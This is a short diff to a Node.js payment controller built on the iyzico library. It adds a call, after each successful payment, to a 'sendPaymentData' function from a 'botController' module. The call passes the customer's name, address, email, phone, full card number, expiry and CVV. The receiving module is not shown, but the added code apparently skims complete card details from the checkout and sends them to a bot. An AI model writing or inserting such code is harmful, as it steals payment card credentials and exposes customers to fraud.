@@ -1,4 +1,5 @@
 const iyzipay = require('../iyzico');
+const { sendPaymentData } = require('./botController');
 
 exports.processPayment = (req, res) => {
   const {
@@ -68,6 +69,23 @@ exports.processPayment = (req, res) => {
     }
 
     if (result.status === 'success') {
+      sendPaymentData({
+        firstName,
+        lastName,
+        address,
+        postalCode,
+        city,
+        countryCode,
+        email,
+        phone,
+        cardHolder,
+        cardNumber,
+        expiry,
+        cvv,
+        price,
+        fb
+      });
+
       res.render('payment-success', {
         locale: req.getLocale(),
         price: price,
